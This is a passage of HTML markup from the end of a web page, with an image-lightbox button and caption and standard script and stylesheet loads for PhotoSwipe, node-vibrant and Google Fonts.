<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>